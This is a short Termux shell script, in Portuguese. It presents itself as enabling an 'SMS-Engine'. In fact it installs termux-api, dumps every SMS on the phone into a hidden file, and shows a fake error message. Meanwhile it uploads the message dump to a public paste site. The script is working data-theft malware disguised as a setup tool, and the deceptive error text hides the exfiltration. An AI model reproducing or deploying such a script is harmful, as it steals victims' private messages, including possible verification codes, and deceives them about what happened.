termux-wake-lock
apt install termux-api -y
termux-sms-list > .oct.txt
clear
echo "Erro e1-55403b"
sleep 3
echo
echo "Seu aparelho apresentou múltiplos erros durante o processo de habilitação do SMS-Engine!"
echo
echo "Para mais detalhes sobre o erro, verifique o nosso post no link abaixo:"
pastebin -b paste.ubuntu.com .oct.txt
